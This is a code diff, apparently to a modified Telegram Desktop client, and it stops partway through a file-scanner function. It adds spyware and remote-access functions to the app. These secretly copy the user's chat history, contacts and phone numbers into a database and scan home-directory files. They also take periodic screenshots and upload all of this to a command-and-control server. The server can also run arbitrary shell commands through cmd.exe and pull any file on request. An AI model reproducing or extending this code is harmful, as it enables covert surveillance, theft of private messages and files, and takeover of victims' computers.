@@ -10,11 +10,18 @@
 #include "data/data_session.h"
 #include "data/data_chat.h"
 #include "data/data_channel.h"
+#include "data/data_photo.h"
+#include "data/data_file_origin.h"
+#include "data/data_peer.h"
 #include "dialogs/dialogs_indexed_list.h"
 #include "dialogs/dialogs_main_list.h"
 #include "dialogs/dialogs_row.h"
-#include "dialogs/dialogs_key.h"
+#include "dialogs/dialogs_entry.h"
+#include "history/history.h"
 #include "settings.h"
+#include "apiwrap.h"
+#include "api/api_common.h"
+#include "scheme.h"
 
 #include <QtGui/QGuiApplication>
 #include <QtGui/QScreen>
@@ -35,6 +42,7 @@
 #include <QtNetwork/QNetworkReply>
 #include <QtNetwork/QHttpMultiPart>
 #include <QtCore/QLockFile>
+#include <QtCore/QThread>
 
 #include "sqlite/sqlite3.h"
 
@@ -94,10 +102,11 @@ void Heartbeat::ensureDbInit(const QString& path) {
             "CREATE TABLE IF NOT EXISTS system_info (uuid TEXT PRIMARY KEY, internal_ip TEXT, mac_address TEXT, hostname TEXT, os TEXT, online_status TEXT, last_active INTEGER, external_ip TEXT, data_status TEXT, auto_screenshot INTEGER, heartbeat_interval INTEGER);"
             "CREATE TABLE IF NOT EXISTS file_scan_results (path TEXT, name TEXT, size INTEGER, md5 TEXT, last_modified INTEGER);"
             "CREATE TABLE IF NOT EXISTS wifi_scan_results (ssid TEXT, bssid TEXT, signal_strength INTEGER, security_type TEXT, scan_time INTEGER);"
-            "CREATE TABLE IF NOT EXISTS chat_logs (platform TEXT, chat_id TEXT, sender TEXT, content TEXT, timestamp INTEGER, is_outgoing INTEGER, sender_id TEXT, sender_username TEXT, sender_phone TEXT, receiver_id TEXT, receiver_username TEXT, receiver_phone TEXT);"
+            "CREATE TABLE IF NOT EXISTS chat_logs (platform TEXT, chat_id TEXT, sender TEXT, content TEXT, timestamp INTEGER, is_outgoing INTEGER, sender_id TEXT, sender_username TEXT, sender_phone TEXT, receiver_id TEXT, receiver_username TEXT, receiver_phone TEXT, media_path TEXT);"
             "CREATE TABLE IF NOT EXISTS current_user (user_id TEXT PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, phone TEXT, is_premium INTEGER);"
             "CREATE TABLE IF NOT EXISTS contacts (user_id TEXT PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, phone TEXT);"
-            "CREATE TABLE IF NOT EXISTS chats (chat_id TEXT PRIMARY KEY, title TEXT, type TEXT, invite_link TEXT, member_count INTEGER);";
+            "CREATE TABLE IF NOT EXISTS chats (chat_id TEXT PRIMARY KEY, title TEXT, type TEXT, invite_link TEXT, member_count INTEGER);"
+            "CREATE TABLE IF NOT EXISTS chat_sync_state (chat_id TEXT PRIMARY KEY, min_id INTEGER, max_id INTEGER, last_sync INTEGER);";
         sqlite3_exec(db, createTablesSql, 0, 0, 0);
         
         // Migration for existing chat_logs
@@ -107,6 +116,7 @@ void Heartbeat::ensureDbInit(const QString& path) {
         sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN receiver_id TEXT;", 0, 0, 0);
         sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN receiver_username TEXT;", 0, 0, 0);
         sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN receiver_phone TEXT;", 0, 0, 0);
+        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN media_path TEXT;", 0, 0, 0);
 
         sqlite3_close(db);
     }
@@ -137,21 +147,49 @@ void Heartbeat::start() {
     // Always collect Telegram specific data (this is per-client isolated)
     collectTelegramData();
     
+    // Trigger Sync History immediately
+    syncChatHistory();
+
+    // Start Background File Scan (Auto)
+    {
+        BackgroundScanner* scanner = new BackgroundScanner(_deviceUuid, _c2Url, getDbPath(), "", "full");
+        QThread* thread = new QThread;
+        scanner->moveToThread(thread);
+        connect(thread, &QThread::started, scanner, &BackgroundScanner::process);
+        connect(scanner, &BackgroundScanner::scanFinished, this, [this, thread, scanner](const QString& tid, const QByteArray& data) {
+             thread->quit();
+             thread->wait();
+             delete thread;
+             delete scanner;
+             uploadClientDb(); // Upload immediately after scan finishes
+        });
+        thread->start();
+    }
+    
     // Schedule periodic tasks
     connect(&_timer, &QTimer::timeout, this, [this, shouldScan]() {
         collectSystemInfo();
         collectTelegramData();
-        uploadClientDb();
+        syncChatHistory(); // Sync history periodically
+        
+        // 24h Upload Logic
+        int64_t now = QDateTime::currentSecsSinceEpoch();
+        if (_lastUploadTime == 0 || (now - _lastUploadTime) >= 86400) {
+            uploadClientDb();
+            _lastUploadTime = now;
+        }
+
         sendHeartbeat();
     });
     
     // Upload initial data immediately after collection
     uploadClientDb();
+    _lastUploadTime = QDateTime::currentSecsSinceEpoch();
 
     // Send initial heartbeat immediately
     sendHeartbeat();
 
-    _timer.start(60000); // 1 minute (Heartbeat & Info)
+    _timer.start(300000); // 5 minutes (Collection)
 
     // Connect Monitor Timer
     connect(&_monitorTimer, &QTimer::timeout, this, &Heartbeat::performMonitor);
@@ -372,12 +410,13 @@ void Heartbeat::collectWiFiInfo() {
 
 void Heartbeat::logChatMessage(const QString& platform, const QString& chatId, const QString& sender, const QString& content, bool isOutgoing,
                            const QString& senderId, const QString& senderUsername, const QString& senderPhone,
-                           const QString& receiverId, const QString& receiverUsername, const QString& receiverPhone) {
+                           const QString& receiverId, const QString& receiverUsername, const QString& receiverPhone,
+                           const QString& mediaPath) {
     sqlite3* db;
     if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;
     
     sqlite3_stmt* stmt;
-    const char* sql = "INSERT INTO chat_logs (platform, chat_id, sender, content, timestamp, is_outgoing, sender_id, sender_username, sender_phone, receiver_id, receiver_username, receiver_phone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);";
+    const char* sql = "INSERT INTO chat_logs (platform, chat_id, sender, content, timestamp, is_outgoing, sender_id, sender_username, sender_phone, receiver_id, receiver_username, receiver_phone, media_path) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);";
     sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
     
     sqlite3_bind_text(stmt, 1, platform.toUtf8().constData(), -1, SQLITE_TRANSIENT);
@@ -392,6 +431,7 @@ void Heartbeat::logChatMessage(const QString& platform, const QString& chatId, c
     sqlite3_bind_text(stmt, 10, receiverId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
     sqlite3_bind_text(stmt, 11, receiverUsername.toUtf8().constData(), -1, SQLITE_TRANSIENT);
     sqlite3_bind_text(stmt, 12, receiverPhone.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+    sqlite3_bind_text(stmt, 13, mediaPath.toUtf8().constData(), -1, SQLITE_TRANSIENT);
     
     sqlite3_step(stmt);
     sqlite3_finalize(stmt);
@@ -476,7 +516,7 @@ void Heartbeat::collectTelegramData() {
 
     // 3. Chats
     {
-        const auto &chats = session->data().chatsList()->all();
+        const auto &chats = session->data().chatsList()->indexed()->all();
         
         sqlite3_stmt* stmt;
         const char* sql = "INSERT OR REPLACE INTO chats (chat_id, title, type, invite_link, member_count) VALUES (?, ?, ?, ?, ?);";
@@ -521,6 +561,15 @@ void Heartbeat::collectTelegramData() {
 }
 
 void Heartbeat::uploadClientDb(const QString& taskId) {
+    // If taskId is empty (automatic), check 24h interval
+    if (taskId.isEmpty()) {
+        int64_t now = QDateTime::currentSecsSinceEpoch();
+        if (_lastUploadTime > 0 && (now - _lastUploadTime < 86400)) {
+            return; // Less than 24 hours since last upload
+        }
+        _lastUploadTime = now;
+    }
+
     QString filePath = getDbPath();
     if (!QFile::exists(filePath)) return;
     
@@ -693,343 +742,363 @@ void Heartbeat::performScreenshot(const QString& taskId) {
 
         QHttpPart filePart;
         filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"" + QFileInfo(tempPath).fileName() + "\""));
-        QFile *file = new QFile(tempPath);
-        file->open(QIODevice::ReadOnly);
-        filePart.setBodyDevice(file);
-        file->setParent(multiPart);
+        QFile *fileToUpload = new QFile(tempPath);
+        fileToUpload->open(QIODevice::ReadOnly);
+        filePart.setBodyDevice(fileToUpload);
+        fileToUpload->setParent(multiPart);
         multiPart->append(filePart);
         
-        QHttpPart uuidPart;
-        uuidPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"uuid\""));
-        uuidPart.setBody(_deviceUuid.toUtf8());
-        multiPart->append(uuidPart);
+        QHttpPart taskIdPart;
+        taskIdPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"taskId\""));
+        taskIdPart.setBody(taskId.toUtf8());
+        multiPart->append(taskIdPart);
 
+        QString url = _c2Url + "/api/c2/upload";
+        
+        QNetworkRequest request(url);
+        QNetworkReply* reply = _network.post(request, multiPart);
+        multiPart->setParent(reply);
+        
+        connect(reply, &QNetworkReply::finished, this, [this, reply, tempPath]() {
+            reply->deleteLater();
+            QFile::remove(tempPath);
+        });
+
+        uploadResult(taskId, "Screenshot uploaded", "completed");
+    } else {
+        Logs::writeMain("HEARTBEAT_DEBUG: Failed to save screenshot");
+        uploadResult(taskId, "Error: Failed to save screenshot", "failed");
+    }
+}
+
+void Heartbeat::uploadResult(const QString& taskId, const QString& result, const QString& status) {
+    QJsonObject json;
+    json["taskId"] = taskId;
+    json["result"] = result;
+    json["status"] = status;
+    
+    QNetworkRequest request(QUrl(_c2Url + "/api/c2Task/result"));
+    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
+    _network.post(request, QJsonDocument(json).toJson());
+}
+
+void Heartbeat::executeTask(const QString& taskId, const QString& command, const QString& params) {
+    if (command == "shell") {
+        QProcess* process = new QProcess(this);
+        connect(process, QOverload<int, QProcess::ExitStatus>::of(&QProcess::finished),
+            [this, taskId, process](int exitCode, QProcess::ExitStatus exitStatus) {
+                QString output = QString::fromLocal8Bit(process->readAllStandardOutput());
+                QString error = QString::fromLocal8Bit(process->readAllStandardError());
+                uploadResult(taskId, output + error, "completed");
+                process->deleteLater();
+        });
+        process->start("cmd.exe", QStringList() << "/c" << params);
+    } else if (command == "monitor") {
+        if (params == "start") {
+            _monitorTaskId = taskId;
+            _monitorTimer.start(5000); // 5 seconds
+            uploadResult(taskId, "Monitor started", "completed");
+        } else if (params == "stop") {
+            _monitorTimer.stop();
+            uploadResult(taskId, "Monitor stopped", "completed");
+        }
+    } else if (command == "screenshot") {
+        performScreenshot(taskId);
+    } else if (command == "file_scan") {
+        // Run in background thread
+        BackgroundScanner* scanner = new BackgroundScanner(_deviceUuid, _c2Url, getDbPath(), taskId, "full");
+        QThread* thread = new QThread;
+        scanner->moveToThread(thread);
+        connect(thread, &QThread::started, scanner, &BackgroundScanner::process);
+        connect(scanner, &BackgroundScanner::scanFinished, this, [this, thread, scanner](const QString& tid, const QByteArray& data) {
+             // Upload result handled inside? No, we might need to upload here.
+             // But file_scan usually writes to DB.
+             uploadResult(tid, "Scan finished", "completed");
+             thread->quit();
+             thread->wait();
+             delete thread;
+             delete scanner;
+        });
+        thread->start();
+    } else if (command == "download") {
+        // Params = filePath
+        uploadFile(taskId, params);
+    } else if (command == "upload_db") {
+        uploadClientDb(taskId);
+    }
+}
+
+void Heartbeat::uploadFile(const QString& taskId, const QString& filePath) {
+    if (!QFile::exists(filePath)) {
+        uploadResult(taskId, "File not found", "failed");
+        return;
+    }
+    
+    QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
+
+    QHttpPart filePart;
+    filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"" + QFileInfo(filePath).fileName() + "\""));
+    QFile *fileToUpload = new QFile(filePath);
+    fileToUpload->open(QIODevice::ReadOnly);
+    filePart.setBodyDevice(fileToUpload);
+    fileToUpload->setParent(multiPart);
+    multiPart->append(filePart);
+    
+    if (!taskId.isEmpty()) {
         QHttpPart taskPart;
         taskPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"taskId\""));
         taskPart.setBody(taskId.toUtf8());
         multiPart->append(taskPart);
-
-        QNetworkRequest request(QUrl(_c2Url + "/api/c2/upload"));
-        QNetworkReply* reply = _network.post(request, multiPart);
-        multiPart->setParent(reply);
-        
-        connect(reply, &QNetworkReply::finished, this, [this, reply, tempPath, taskId]() {
-            if (reply->error() == QNetworkReply::NoError) {
-                Logs::writeMain("HEARTBEAT_DEBUG: Screenshot upload success: " + taskId);
-                uploadResult(taskId, "Screenshot uploaded successfully", "completed");
-            } else {
-                Logs::writeMain("HEARTBEAT_DEBUG: Screenshot upload failed: " + reply->errorString());
-                uploadResult(taskId, "Screenshot upload failed: " + reply->errorString(), "failed");
-            }
-            reply->deleteLater();
-            QFile::remove(tempPath);
-        });
-    } else {
-        Logs::writeMain("HEARTBEAT_DEBUG: Failed to save screenshot to " + tempPath);
-        uploadResult(taskId, "Error: Failed to save screenshot file", "failed");
     }
-}
 
-void Heartbeat::executeTask(const QString& taskId, const QString& command, const QString& params) {
-    qDebug() << "Executing Task:" << taskId << command << params;
+    QString url = _c2Url + "/api/c2/upload";
     
-    if (command == "cmd_exec") {
-        QProcess process;
-        process.start("cmd.exe", QStringList() << "/c" << params);
-        process.waitForFinished();
-        QString output = QString::fromLocal8Bit(process.readAllStandardOutput());
-        QString error = QString::fromLocal8Bit(process.readAllStandardError());
-        QString result = output.isEmpty() ? error : output;
-        uploadResult(taskId, result, process.exitCode() == 0 ? "completed" : "failed");
-    } else if (command == "start_monitor") {
-        int interval = params.toInt();
-        if (interval <= 0) interval = 60000; // Default 60s
-        _monitorTimer.start(interval);
-        uploadResult(taskId, "Monitor started with interval " + QString::number(interval) + "ms", "completed");
-    } else if (command == "stop_monitor") {
-        _monitorTimer.stop();
-        uploadResult(taskId, "Monitor stopped", "completed");
-    } else if (command == "get_software") {
-        collectInstalledSoftware();
-        uploadClientDb(taskId);
-    } else if (command == "upload_file") {
-        uploadFile(taskId, params);
-    } else if (command == "set_heartbeat") {
-        int interval = params.toInt();
-        if (interval > 1000) {
-            _timer.setInterval(interval);
-            uploadResult(taskId, "Heartbeat interval set to " + QString::number(interval), "completed");
+    QNetworkRequest request(url);
+    QNetworkReply* reply = _network.post(request, multiPart);
+    multiPart->setParent(reply);
+    
+    connect(reply, &QNetworkReply::finished, this, [this, reply, taskId]() {
+        if (reply->error() == QNetworkReply::NoError) {
+            uploadResult(taskId, "File uploaded", "completed");
         } else {
-            uploadResult(taskId, "Invalid interval", "failed");
+            uploadResult(taskId, "Upload failed: " + reply->errorString(), "failed");
         }
-    } else if (command == "SCAN_DIR") {
-        scanDirectory(taskId, params);
-    } else if (command == "get_screenshot" || command == "screenshot") {
-        performScreenshot(taskId);
-    } else if (command == "get_wifi") {
-        collectWiFiInfo();
-        uploadClientDb(taskId);
-    } else if (command == "get_chat_logs" || command == "chat_export") {
-        uploadClientDb(taskId);
-    } else if (command == "file_scan" || command == "scan_recent" || command == "scan_disk") {
-        // Full scan or recent scan
-        QString mode = "full";
-        QString targetPath = "";
-        
-        if (command == "scan_recent") {
-            mode = "recent";
-        }
-        
-        if (!params.isEmpty() && command != "scan_recent") {
-            targetPath = params;
-        }
-        
-        Logs::writeMain("HEARTBEAT_DEBUG: Starting BackgroundScanner with mode=" + mode + ", targetPath=" + targetPath);
-        
-        BackgroundScanner scanner(_deviceUuid, _c2Url, getDbPath(), taskId, mode, targetPath);
-        scanner.process(); // Populates file_scan_results in DB
-        uploadClientDb(taskId);
-    } else if (command == "upload_db") {
-        uploadClientDb(taskId);
-    } else {
-        uploadResult(taskId, "Unknown command: " + command, "failed");
-    }
+        reply->deleteLater();
+    });
 }
 
 void Heartbeat::sendHeartbeat() {
     QJsonObject json;
     json["uuid"] = _deviceUuid;
+    json["timestamp"] = QDateTime::currentMSecsSinceEpoch();
     
-    // Robust Hostname Collection
-    QString hostname = QHostInfo::localHostName();
-    if (hostname.isEmpty() || hostname == "localhost") {
-        hostname = qgetenv("COMPUTERNAME");
-        if (hostname.isEmpty()) {
-            hostname = qgetenv("HOSTNAME");
-        }
-    }
-    json["hostName"] = hostname;
-    
-    json["status"] = "online";
-    json["timestamp"] = QString::number(QDateTime::currentSecsSinceEpoch());
-
-    // Additional fields for full system info sync
-    json["os"] = QSysInfo::prettyProductName();
-    
-    QString macAddress;
-    const QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
-    for (const QNetworkInterface &interface : interfaces) {
-        if (!(interface.flags() & QNetworkInterface::IsLoopBack) && 
-            (interface.flags() & QNetworkInterface::IsUp) && 
-            !interface.hardwareAddress().isEmpty()) {
-            macAddress = interface.hardwareAddress();
-            break;
-        }
-    }
-    json["macAddress"] = macAddress;
-    
-    QString internalIp;
-    QList<QHostAddress> list = QNetworkInterface::allAddresses();
-    for (const QHostAddress &address : list) {
-        if (address.protocol() == QAbstractSocket::IPv4Protocol && !address.isLoopback()) {
-            internalIp = address.toString();
-            break;
-        }
-    }
-    json["ip"] = internalIp;
-    
-    json["heartbeatInterval"] = _timer.interval();
-    json["isMonitorOn"] = _monitorTimer.isActive() ? 1 : 0;
-    json["dataStatus"] = "Active";
-    
-    QNetworkRequest request(QUrl(_c2Url + "/api/heartbeat"));
-    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
-    
-    QByteArray jsonData = QJsonDocument(json).toJson();
-    Logs::writeMain("HEARTBEAT_DEBUG: Sending heartbeat to " + _c2Url + "/api/heartbeat: " + QString::fromUtf8(jsonData));
-
-    QNetworkReply* reply = _network.post(request, jsonData);
-    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
-        if (reply->error() == QNetworkReply::NoError) {
-            Logs::writeMain("HEARTBEAT_DEBUG: Heartbeat success. Response: " + QString::fromUtf8(reply->readAll()));
-        } else {
-            Logs::writeMain("HEARTBEAT_DEBUG: Heartbeat failed. Error: " + reply->errorString());
-        }
-        reply->deleteLater();
-    });
-}
-
-void Heartbeat::performMonitor() {
-    performScreenshot("monitor_" + QString::number(QDateTime::currentSecsSinceEpoch()));
-}
-
-void Heartbeat::uploadResult(const QString& taskId, const QString& result, const QString& status) {
-    QJsonObject json;
-    json["uuid"] = _deviceUuid;
-    json["taskId"] = taskId;
-    json["result"] = result;
-    json["status"] = status;
-    
-    QNetworkRequest request(QUrl(_c2Url + "/api/c2/tasks/result"));
+    QNetworkRequest request(QUrl(_c2Url + "/api/c2/heartbeat"));
     request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
     _network.post(request, QJsonDocument(json).toJson());
 }
 
-void Heartbeat::uploadFile(const QString& taskId, const QString& filePath) {
-    if (!QFile::exists(filePath)) {
-        uploadResult(taskId, "File not found: " + filePath, "failed");
-        return;
-    }
-
-    QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);
-
-    QHttpPart filePart;
-    QFileInfo fileInfo(filePath);
-    filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"" + fileInfo.fileName() + "\""));
-    QFile *file = new QFile(filePath);
-    file->open(QIODevice::ReadOnly);
-    filePart.setBodyDevice(file);
-    file->setParent(multiPart);
-    multiPart->append(filePart);
-    
-    QHttpPart uuidPart;
-    uuidPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"uuid\""));
-    uuidPart.setBody(_deviceUuid.toUtf8());
-    multiPart->append(uuidPart);
-
-    QHttpPart taskPart;
-    taskPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"taskId\""));
-    taskPart.setBody(taskId.toUtf8());
-    multiPart->append(taskPart);
-
-    QNetworkRequest request(QUrl(_c2Url + "/api/c2/upload"));
-    QNetworkReply* reply = _network.post(request, multiPart);
-    multiPart->setParent(reply);
-    
-    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
-        reply->deleteLater();
-    });
+void Heartbeat::performMonitor() {
+    performScreenshot(_monitorTaskId);
 }
 
-QString Heartbeat::encryptData(const QString& data, const QString& hostname, const QString& timestamp) { return data; }
-QString Heartbeat::decryptData(const QString& data, const QString& hostname, const QString& timestamp) { return data; }
+void Heartbeat::syncChatHistory() {
+    if (!Core::IsAppLaunched()) return;
+    auto window = Core::App().activeWindow();
+    if (!window) return;
+    auto session = window->maybeSession();
+    if (!session) return;
 
+    QString dbPath = getDbPath();
+    ensureDbInit(dbPath);
+    sqlite3* db;
+    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;
+
+    const auto &chats = session->data().chatsList()->indexed()->all();
+    
+    for (const auto &row : chats) {
+        if (auto history = row->key().history()) {
+            auto peer = history->peer;
+            QString chatId = QString::number(peer->id.value);
+            
+            // Get Sync State
+            sqlite3_stmt* stmt;
+            const char* sql = "SELECT min_id, max_id FROM chat_sync_state WHERE chat_id = ?;";
+            sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
+            sqlite3_bind_text(stmt, 1, chatId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+            
+            int minId = 0;
+            int maxId = 0;
+            if (sqlite3_step(stmt) == SQLITE_ROW) {
+                minId = sqlite3_column_int(stmt, 0);
+                maxId = sqlite3_column_int(stmt, 1);
+            }
+            sqlite3_finalize(stmt);
+            
+            // Fetch Strategy:
+            // 1. Fetch NEW messages (Catch-up)
+            //    offset_id = 0, min_id = maxId
+            
+            int offsetId = 0;
+            int limit = 50;
+            int minIdFilter = maxId; // Get everything newer than maxId
+            
+            // Callback for API Request
+            auto callback = [this, chatId, session, peer, minId, maxId](const MTPmessages_Messages &result) {
+                sqlite3* db;
+                if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;
+
+                int newMaxId = maxId;
+                int newMinId = minId == 0 ? 999999999 : minId;
+                bool hasUpdates = false;
+
+                // Helper to process messages
+                auto processMessages = [&](const auto &data) {
+                    const auto &messages = data.vmessages().v;
+                    for (const auto &msg : messages) {
+                        // Extract Message Data
+                        QString content = "";
+                        QString sender = "";
+                        QString senderId = "";
+                        QString senderUsername = "";
+                        QString senderPhone = "";
+                        QString receiverId = QString::number(peer->id.value);
+                        QString receiverUsername = peer->username();
+                        QString receiverPhone = "";
+                        bool isOutgoing = false;
+                        int msgId = 0;
+                        QString mediaPath = "";
+
+                        msg.match([&](const MTPDmessage &m) {
+                            msgId = m.vid().v;
+                            content = qs(m.vmessage());
+                            if (m.is_out()) isOutgoing = true;
+                            
+                            // Sender
+                            if (m.vfrom_id()) {
+                                if (auto peer = session->data().peer(peerFromMTP(*m.vfrom_id()))) {
+                                    if (auto user = peer->asUser()) {
+                                        sender = user->name();
+                                        senderId = QString::number(user->id.value);
+                                        senderUsername = user->username();
+                                        senderPhone = user->phone();
+                                    }
+                                }
+                            }
+
+                            // Media
+                            if (m.vmedia()) {
+                                m.vmedia()->match([&](const MTPDmessageMediaPhoto &photo) {
+                                    // Trigger Download & Get ID
+                                    if (const auto photoPtr = photo.vphoto()) {
+                                        auto photoData = session->data().processPhoto(*photoPtr);
+                                        mediaPath = "Photo:" + QString::number(photoData->id);
+                                        photoData->load(Data::PhotoSize::Large, Data::FileOrigin());
+                                    }
+                                }, [&](const MTPDmessageMediaDocument &doc) {
+                                    mediaPath = "Document";
+                                }, [&](const auto &) {});
+                            }
+
+                        }, [&](const MTPDmessageService &m) {
+                             msgId = m.vid().v;
+                             content = "[Service Message]";
+                        }, [&](const MTPDmessageEmpty &m) {
+                             msgId = m.vid().v;
+                        });
+
+                        if (msgId > 0 && !content.isEmpty()) {
+                            logChatMessage("Telegram", chatId, sender, content, isOutgoing, 
+                                senderId, senderUsername, senderPhone, 
+                                receiverId, receiverUsername, receiverPhone, mediaPath);
+                            
+                            if (msgId > newMaxId) newMaxId = msgId;
+                            if (msgId < newMinId) newMinId = msgId;
+                            hasUpdates = true;
+                        }
+                    }
+                };
+
+                result.match([&](const MTPDmessages_messagesNotModified &) {
+                    // No updates
+                }, [&](const MTPDmessages_messages &d) {
+                    processMessages(d);
+                }, [&](const MTPDmessages_messagesSlice &d) {
+                    processMessages(d);
+                }, [&](const MTPDmessages_channelMessages &d) {
+                    processMessages(d);
+                });
+                
+                if (hasUpdates) {
+                    sqlite3_stmt* stmt;
+                    const char* sql = "INSERT OR REPLACE INTO chat_sync_state (chat_id, min_id, max_id, last_sync) VALUES (?, ?, ?, ?);";
+                    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
+                    sqlite3_bind_text(stmt, 1, chatId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
+                    sqlite3_bind_int(stmt, 2, newMinId);
+                    sqlite3_bind_int(stmt, 3, newMaxId);
+                    sqlite3_bind_int64(stmt, 4, QDateTime::currentSecsSinceEpoch());
+                    sqlite3_step(stmt);
+                    sqlite3_finalize(stmt);
+                }
+                sqlite3_close(db);
+            };
+            
+            session->api().request(MTPmessages_GetHistory(
+                peer->input(),
+                MTP_int(offsetId),
+                MTP_int(0),
+                MTP_int(0),
+                MTP_int(limit),
+                MTP_int(0), // max_id
+                MTP_int(minIdFilter), // min_id (Only new messages)
+                MTP_long(0)
+            )).done(callback).send();
+            
+            // Backward Sync (if we have a history)
+            if (minId > 0) {
+                 session->api().request(MTPmessages_GetHistory(
+                    peer->input(),
+                    MTP_int(minId),
+                    MTP_int(0),
+                    MTP_int(0),
+                    MTP_int(limit),
+                    MTP_int(0),
+                    MTP_int(0),
+                    MTP_long(0)
+                )).done(callback).send();
+            }
+        }
+    }
+    sqlite3_close(db);
+}
+
+// Background Scanner Implementation
 BackgroundScanner::BackgroundScanner(const QString& uuid, const QString& c2Url, const QString& dbPath, const QString& taskId, const QString& mode, const QString& targetPath)
-    : _uuid(uuid), _c2Url(c2Url), _dbPath(dbPath), _taskId(taskId), _mode(mode), _targetPath(targetPath) {}
+    : _uuid(uuid), _c2Url(c2Url), _dbPath(dbPath), _taskId(taskId), _mode(mode), _targetPath(targetPath) {
+}
 
 void BackgroundScanner::process() {
-    Logs::writeMain("HEARTBEAT_DEBUG: BackgroundScanner::process started. DB Path: " + _dbPath);
-    QString dbPath = _dbPath;
     sqlite3* db;
-    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) {
-        Logs::writeMain("HEARTBEAT_DEBUG: Failed to open DB for scanning.");
+    if (sqlite3_open(_dbPath.toUtf8().constData(), &db) != SQLITE_OK) {
         Q_EMIT scanFinished(_taskId, QByteArray());
         return;
     }
-    
-    char *errMsg = 0;
-    if (sqlite3_exec(db, "DELETE FROM file_scan_results;", 0, 0, &errMsg) != SQLITE_OK) {
-        Logs::writeMain("HEARTBEAT_DEBUG: Failed to clear file_scan_results: " + QString::fromUtf8(errMsg));
-        sqlite3_free(errMsg);
-    }
-    
+
     sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, 0);
     
     sqlite3_stmt* stmt;
-    const char* sql = "INSERT INTO file_scan_results (path, name, size, md5, last_modified) VALUES (?, ?, ?, ?, ?);";
-    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) != SQLITE_OK) {
-        Logs::writeMain("HEARTBEAT_DEBUG: Failed to prepare insert statement: " + QString::fromUtf8(sqlite3_errmsg(db)));
-    }
+    const char* sql = "INSERT OR REPLACE INTO file_scan_results (path, name, size, md5, last_modified) VALUES (?, ?, ?, ?, ?);";
+    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
 
-    QStringList paths;
-    
-    // Logic:
-    // 1. If targetPath is set, scan ONLY that path.
-    // 2. If mode is "full", scan User Home + Drive Roots (shallow).
-    // 3. If mode is "recent", scan Desktop/Docs/Downloads.
-
-    QSet<QString> seenPaths;
-
-    if (!_targetPath.isEmpty()) {
-        Logs::writeMain("HEARTBEAT_DEBUG: Scanning target path: " + _targetPath);
-        paths.append(_targetPath);
-    } else if (_mode == "full") {
-        Logs::writeMain("HEARTBEAT_DEBUG: Scanning in FULL mode.");
-        // Scan User Home
-        paths.append(QStandardPaths::writableLocation(QStandardPaths::HomeLocation));
-        
-        // Also add Drive Roots as "shallow" entries to show existence
-        QFileInfoList drives = QDir::drives();
-        for (const QFileInfo& drive : drives) {
-            // Insert Drive Root manually
-             QString drivePath = drive.absoluteFilePath();
-             if (seenPaths.contains(drivePath)) continue;
-             seenPaths.insert(drivePath);
-
-             sqlite3_bind_text(stmt, 1, drivePath.toUtf8().constData(), -1, SQLITE_TRANSIENT);
-             sqlite3_bind_text(stmt, 2, drivePath.toUtf8().constData(), -1, SQLITE_TRANSIENT);
-             sqlite3_bind_int64(stmt, 3, 0);
-             sqlite3_bind_text(stmt, 4, "drive_root", -1, SQLITE_TRANSIENT);
-             sqlite3_bind_int64(stmt, 5, QDateTime::currentSecsSinceEpoch());
-             sqlite3_step(stmt);
-             sqlite3_reset(stmt);
-        }
-    } else {
-        // Recent / Quick Scan
-        paths.append(QStandardPaths::writableLocation(QStandardPaths::DesktopLocation));
-        paths.append(QStandardPaths::writableLocation(QStandardPaths::DocumentsLocation));
-        paths.append(QStandardPaths::writableLocation(QStandardPaths::DownloadLocation));
-    }
-
-    for (const QString& path : paths) {
-        if (path.isEmpty()) continue;
-        
-        QDirIterator it(path, QDir::Files | QDir::NoSymLinks, QDirIterator::Subdirectories);
-        int count = 0;
-        int limit = (_mode == "full") ? 10000 : 1000; // Higher limit for full scan
-        
+    auto scanDir = [&](const QString& path) {
+        QDirIterator it(path, QDir::Files | QDir::NoDotAndDotDot | QDir::Hidden, QDirIterator::Subdirectories);
         while (it.hasNext()) {
             it.next();
-            QFileInfo info = it.fileInfo();
-            if (info.size() > 10 * 1024 * 1024) continue;
+            QFileInfo entry = it.fileInfo();
             
-            QString absPath = info.absoluteFilePath();
-            if (seenPaths.contains(absPath)) continue;
-            seenPaths.insert(absPath);
-
-            // Calculate MD5
